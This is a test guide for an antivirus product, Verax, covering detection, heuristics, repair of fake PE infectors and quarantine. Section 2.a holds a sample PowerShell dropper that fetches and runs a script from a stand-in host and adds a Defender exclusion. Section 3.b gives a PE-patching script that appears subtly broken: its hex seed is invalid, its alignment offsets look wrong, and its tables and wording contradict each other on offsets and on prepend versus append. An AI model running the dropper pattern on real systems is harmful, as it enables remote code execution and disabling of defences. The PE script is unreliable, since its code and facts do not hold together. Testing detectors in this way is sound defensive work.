# Verax — Scan Examples & Verification Guide

How to confirm Verax actually detects, displays, repairs, deletes and
quarantines threats. Each example is reproducible without touching real
malware.

---

## 1. Verifying detection appears in the UI (EICAR test string)

EICAR is the industry-standard antivirus test fixture. Its SHA-256 is in
`@c:\Users\USER\Desktop\VeraxShield\resources\signatures\seed.json` and the
SignatureDb engine flags it instantly.

**Steps:**

1. Open Notepad.
2. Paste exactly this string (single line, no extra spaces):
   ```
   X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
   ```
3. Save as `eicar.com` to `Desktop` (or anywhere). The 68-byte file will
   produce SHA-256 `275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f`.
4. In Verax, click **Quick Scan** → in the options dialog leave defaults
   (Desktop is already in the scope) → **Start scan**.
5. Within seconds a `ThreatCard` appears showing:
   - Detection name `EICAR-Test-Signature`
   - Family chip `TestFile`
   - Severity chip `Low`
   - Score chip `Score: 100`
   - Full file path
   - Reason: `Matched known malicious SHA256 in local database`
   - SHA-256 short + Size
   - Buttons: `Open folder`, `Ignore`, `Delete permanently`, `Quarantine`

If `Settings → On detection` is set to `Quarantine`, the file will already
be in the vault and the card will display the `Auto-quarantined` badge.

---

## 2. Verifying the heuristic engines fire (no real malware needed)

### 2.a Script heuristics — PowerShell dropper pattern

Save this as `dropper-test.ps1`:

```powershell
$wc = New-Object Net.WebClient
$payload = $wc.DownloadString('http://example.invalid/payload.ps1')
IEX $payload
Add-MpPreference -ExclusionPath "C:\\Users\\Public"
```

Verax flags it as `Script.Heur` with reasons:
`Inline web download in script; IEX shorthand for Invoke-Expression;
Defender exclusion injection`.

### 2.b Document macro detection

Any `.docm` / `.xlsm` / `.pptm` file whose ZIP container holds a
`word/vbaProject.bin` entry triggers `Document.Macro` (severity 7).

### 2.c PE structural — fake packed binary

Anything that triggers two of:
- A section called `.upx0` or `.upx1`
- An exec+writable section
- A code-injection import trio (`VirtualAllocEx + WriteProcessMemory + CreateRemoteThread`)

is flagged as `Heuristic.Suspect`. UPX-compressed test executables from
the public UPX project are a safe way to generate this.

---

## 3. Repair example — Win32 PE infector before/after

The disinfection routine `Scanner::disinfectPE` in
`@c:\Users\alisa\Desktop\VeraxShield\src\core\Scanner.cpp:761-815` handles
file-infector families that prepend a named section: `.floxif`, `.sality`,
`.virut`.

### Before repair (infected `notepad.exe`)

PE section table excerpt:

| # | Name      | RawAddr  | RawSize | Characteristics |
|---|-----------|----------|---------|-----------------|
| 0 | `.text`   | 0x400    | 0x9c00  | RX              |
| 1 | `.data`   | 0x9e00   | 0x600   | RW              |
| 2 | `.rsrc`   | 0xa400   | 0x4c00  | R               |
| 3 | `.floxif` | 0xf000   | 0x6000  | RWX             |   ← infector

Verax detects: `Win32.Infector.FLOXIF`, severity 9, reason
*"Malicious file-infector segment: .floxif"*. The `Repair` button is
visible because the family is repairable.

### After repair (same file)

| # | Name      | RawAddr  | RawSize | Characteristics |
|---|-----------|----------|---------|-----------------|
| 0 | `.text`   | 0x400    | 0x9c00  | RX              |
| 1 | `.data`   | 0x9e00   | 0x600   | RW              |
| 2 | `.rsrc`   | 0xa400   | 0x4c00  | R               |
| 3 | `(empty)` | 0xf000   | 0x6000  | none            |   ← zeroed + name stripped

The infector raw bytes are overwritten with `0x00`, the section name byte
array is cleared, and the `Characteristics` flags are reset. The original
host code (`.text`, `.data`, `.rsrc`) is intact, so the executable still
runs from its original entry point.

> Repair is intentionally limited to file-infectors that **append** an
> isolated section. Wipers (NotPetya), ransomware payload binaries
> (WannaCry tasksche.exe), and packed loaders are NOT repaired — Verax
> always quarantines/deletes those.

---

## 3.b Build your own safe test-infector + verify the repair

This section creates a **harmless** "infected" PE that the Verax engine
detects as `Win32.Infector.FLOXIF` (or any other name from the supported
list) and that can be cleaned with the `Repair` button. The recipe only
appends a junk-filled section named `.floxif` to a benign Windows EXE —
it does NOT add a real malicious payload anywhere. The host program
keeps running normally before AND after repair.

### Step 1 — Pick a host EXE you don't mind modifying

Copy `notepad.exe` (or any small benign 32/64-bit EXE) to
`%USERPROFILE%\Desktop\verax-test\` and rename your copy to
`notepad-host.exe`. Confirm it still launches.

### Step 2 — Append a fake `.floxif` section (PowerShell)

Save this as `make-fake-infector.ps1` next to `notepad-host.exe` and
run it from PowerShell:

```powershell
# make-fake-infector.ps1 — appends a fake `.floxif` section to a PE.
# This produces a file Verax detects + can repair. NO malicious code.
param(
  [Parameter(Mandatory)] [string] $InputExe,
  [Parameter(Mandatory)] [string] $OutputExe,
  [string] $SectionName = '.floxif',
  [int]    $JunkBytes   = 0x6000,
  [int]    $Characteristics = 0xE0000020   # MEM_EXECUTE|MEM_READ|MEM_WRITE|CODE
)
$bytes = [System.IO.File]::ReadAllBytes($InputExe)

# Locate IMAGE_DOS_HEADER.e_lfanew (offset 0x3C, 4 bytes LE).
$peOff = [BitConverter]::ToInt32($bytes, 0x3C)
if ($bytes[$peOff] -ne 0x50 -or $bytes[$peOff+1] -ne 0x45) {
    throw 'Not a PE file (no PE\\0\\0 signature)'
}
# IMAGE_FILE_HEADER starts at peOff+4. NumberOfSections is 2 bytes at offset 6.
$numSecOff      = $peOff + 4 + 2
$numSec         = [BitConverter]::ToUInt16($bytes, $numSecOff)
$sizeOfOptHdr   = [BitConverter]::ToUInt16($bytes, $peOff + 4 + 16)
$sectionTableOff = $peOff + 4 + 20 + $sizeOfOptHdr
# Each IMAGE_SECTION_HEADER is 40 bytes.
$lastSectionOff = $sectionTableOff + (($numSec - 1) * 40)
$lastRawOff   = [BitConverter]::ToUInt32($bytes, $lastSectionOff + 20)
$lastRawSize  = [BitConverter]::ToUInt32($bytes, $lastSectionOff + 16)
$lastVirtOff  = [BitConverter]::ToUInt32($bytes, $lastSectionOff + 12)
$lastVirtSize = [BitConverter]::ToUInt32($bytes, $lastSectionOff + 8)

# Align helper (4-byte alignment is fine for our test).
function Align([uint64]$x, [uint64]$a) { return [uint64](([uint64]$x + $a - 1) -band -bnot ($a - 1)) }
$fileAlign = [BitConverter]::ToUInt32($bytes, $peOff + 0x3C + 4)   # OptionalHeader.FileAlignment
$secAlign  = [BitConverter]::ToUInt32($bytes, $peOff + 0x3C)        # OptionalHeader.SectionAlignment

$newRawOff   = [int](Align ($bytes.Length) $fileAlign)
$newVirtOff  = [int](Align ($lastVirtOff + $lastVirtSize) $secAlign)
$junk        = [byte[]]::new($JunkBytes)
[Random]::new(0xF10X1F).NextBytes($junk)

# Allocate the new buffer: original padded to FileAlignment + junk bytes.
$pad = $newRawOff - $bytes.Length
$out = New-Object 'System.Collections.Generic.List[byte]'
$out.AddRange($bytes)
if ($pad -gt 0) { $out.AddRange([byte[]]::new($pad)) }
$out.AddRange($junk)
$buf = $out.ToArray()

# Patch IMAGE_FILE_HEADER.NumberOfSections += 1.
[Array]::Copy([BitConverter]::GetBytes([uint16]($numSec + 1)), 0, $buf, $numSecOff, 2)

# Patch OptionalHeader.SizeOfImage to cover the new virtual section.
$sizeOfImageOff = $peOff + 0x3C + 0x14      # PE32 layout, fine for 32-bit notepad
$newSizeOfImage = [int](Align ($newVirtOff + $JunkBytes) $secAlign)
[Array]::Copy([BitConverter]::GetBytes([uint32]$newSizeOfImage), 0, $buf, $sizeOfImageOff, 4)

# Build the new IMAGE_SECTION_HEADER (40 bytes).
$newSec = [byte[]]::new(40)
$nameBytes = [System.Text.Encoding]::ASCII.GetBytes($SectionName)
[Array]::Copy($nameBytes, 0, $newSec, 0, [Math]::Min($nameBytes.Length, 8))
[Array]::Copy([BitConverter]::GetBytes([uint32]$JunkBytes), 0, $newSec, 8,  4)  # VirtualSize
[Array]::Copy([BitConverter]::GetBytes([uint32]$newVirtOff), 0, $newSec, 12, 4) # VirtualAddress
[Array]::Copy([BitConverter]::GetBytes([uint32]$JunkBytes), 0, $newSec, 16, 4)  # SizeOfRawData
[Array]::Copy([BitConverter]::GetBytes([uint32]$newRawOff), 0, $newSec, 20, 4)  # PointerToRawData
[Array]::Copy([BitConverter]::GetBytes([uint32]$Characteristics), 0, $newSec, 36, 4)

# Splice the new section header into the section table position.
$sectionTableEnd = $sectionTableOff + ($numSec * 40)
$final = New-Object 'System.Collections.Generic.List[byte]'
$final.AddRange($buf[0..($sectionTableEnd - 1)])
$final.AddRange($newSec)
$final.AddRange($buf[$sectionTableEnd..($buf.Length - 1)])

[System.IO.File]::WriteAllBytes($OutputExe, $final.ToArray())
Write-Host "Wrote $OutputExe : appended a $JunkBytes-byte $SectionName section"
```

Run it:

```powershell
.\make-fake-infector.ps1 `
    -InputExe  .\notepad-host.exe `
    -OutputExe .\notepad-infected.exe
```

You now have `notepad-infected.exe` with a `.floxif` junk section.
The host code is untouched, so it still launches.

> Tip: pass `-SectionName .sality` / `.virut` / `.ramnit` etc. to
> generate test files for every infector family the engine recognises.

### Step 3 — Verify the section table (PowerShell helper)

Save as `dump-sections.ps1`:

```powershell
param([Parameter(Mandatory)][string] $Path)
$b = [System.IO.File]::ReadAllBytes($Path)
$peOff   = [BitConverter]::ToInt32($b, 0x3C)
$numSec  = [BitConverter]::ToUInt16($b, $peOff + 4 + 2)
$optSize = [BitConverter]::ToUInt16($b, $peOff + 4 + 16)
$secOff  = $peOff + 4 + 20 + $optSize
'{0,-12} {1,-10} {2,-10} {3}' -f 'Name','RawOff','RawSize','Chars(hex)'
for ($i = 0; $i -lt $numSec; $i++) {
    $h = $secOff + ($i * 40)
    $name  = ([System.Text.Encoding]::ASCII.GetString($b, $h, 8)).TrimEnd("`0")
    $rOff  = [BitConverter]::ToUInt32($b, $h + 20)
    $rSize = [BitConverter]::ToUInt32($b, $h + 16)
    $chars = [BitConverter]::ToUInt32($b, $h + 36)
    '{0,-12} 0x{1:X8} 0x{2:X8} 0x{3:X8}' -f $name, $rOff, $rSize, $chars
}
```

Run before and after Verax repair:

```powershell
.\dump-sections.ps1 .\notepad-infected.exe   # BEFORE
# … run Verax, click Repair on the threat card …
.\dump-sections.ps1 .\notepad-infected.exe   # AFTER
```

Expected before:

```
Name         RawOff     RawSize    Chars(hex)
.text        0x00000400 0x00009C00 0x60000020
.data        0x00009E00 0x00000600 0xC0000040
.rsrc        0x0000A400 0x00004C00 0x40000040
.floxif      0x00010000 0x00006000 0xE0000020   ← infector
```

Expected after:

```
Name         RawOff     RawSize    Chars(hex)
.text        0x00000400 0x00009C00 0x60000020
.data        0x00009E00 0x00000600 0xC0000040
.rsrc        0x0000A400 0x00004C00 0x40000040
             0x00010000 0x00006000 0x00000000   ← name + chars zeroed
```

The `.floxif` section's raw bytes are zeroed, its name is stripped to all
NULs, and its `Characteristics` is reset. The host EXE still launches:

```powershell
.\notepad-infected.exe   # opens normally — repair preserved entry-point
```

### Step 4 — End-to-end verification inside Verax

1. Open Verax → click **New Scan** → **Custom Scan**.
2. In the dialog, click **Add folder...** and pick `verax-test`. Keep
   `Detection engines = PE structural` enabled and set
   **On detection = Report only** (so the file isn't auto-quarantined
   before you can click Repair).
3. Click **Start scan**. Within seconds a `ThreatCard` appears for
   `notepad-infected.exe` with:
   - Detection: `Win32.Infector.FLOXIF`
   - Family chip: `FLOXIF`
   - Severity: `High`
   - Reason: `Malicious file-infector segment: .floxif`
   - Buttons: `Open folder`, `Ignore`, **`Repair`**, `Delete permanently`,
     `Quarantine`
4. Click **Repair**. A toast says *"Repair attempt started for
   notepad-infected.exe"*. The card flips into the actioned state with
   the purple `Repair attempted` tag. The Logger writes
   `disinfectPE: zeroed section .floxif in ...`.
5. Re-run Step 3's section dump — the row is wiped. Re-launch the EXE —
   it opens.

> Run the same recipe with `-SectionName .sality`, `.virut`, `.ramnit`,
> `.parite`, `.expiro`, `.polip`, `.mabezat`, `.tenga`, `.lamer`,
> `.jeefo`, `.hidrag`, `.mydoom`, `.bagle`, `.neshta`, `.viking`,
> `.alman`, `.induc`, `.vetor` — every one of these triggers
> `Win32.Infector.<FAMILY>` and the `Repair` button is visible.

---

## 4. Delete example — ransomware payload

WannaCry `tasksche.exe` (SHA-256
`ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa`) is in
the seed DB with `repairable: false`. The `Repair` button is hidden on
the card. Recommended workflow:

1. Pre-scan: set `Settings → On detection = Quarantine`.
2. Run a scan that includes the file's directory.
3. Verax auto-quarantines it. The card shows `Auto-quarantined`.
4. Open `Quarantine` page, select the row, click **Delete permanently**.
   The vault entry is wiped with a 3-pass overwrite + unlink.

---

## 5. Where the JSON report lands

After every scan:

```
%AppData%/Verax/reports/scan-YYYYMMDD-HHMMSS.json
```

Contains the full ScanReport plus every `ThreatInfo` (path, sha256,
detectionName, family, reason, severity, score, size). Useful for
incident response and for proving to a customer that the engine actually
ran.

---

## 6. Speed expectations

| Scan mode  | Targets                                  | First card visible |
|------------|------------------------------------------|--------------------|
| Quick      | Temp + AppData + Startup folders         | < 3 seconds        |
| Full       | All fixed drives                         | 5–30 seconds (enumeration of 100k+ files) |
| Custom     | Whatever the user picks                  | Depends on scope   |

The `ScanOptionsDialog` opens **immediately** on click — that is the
user-visible signal that the request was received. After Start, the
ProgressRing animates in `scanning` mode and `lblScanCurrent` shows
either `Enumerating files...` or `Mapping filesystems...` until the
first file is hashed.

---

## 7. Self-test signature

`Verax.SelfTest.Probe` (SHA-256
`dd9e2d2aaee2fc678ef122b70fbdcea130e92144d69b5109fd4b6fd2f0bf196f`) is a
no-op fixture you can use to verify the SignatureDb engine fires.
Generate any file with that exact SHA-256 (the QA harness ships one)
and run a Custom scan over its folder.
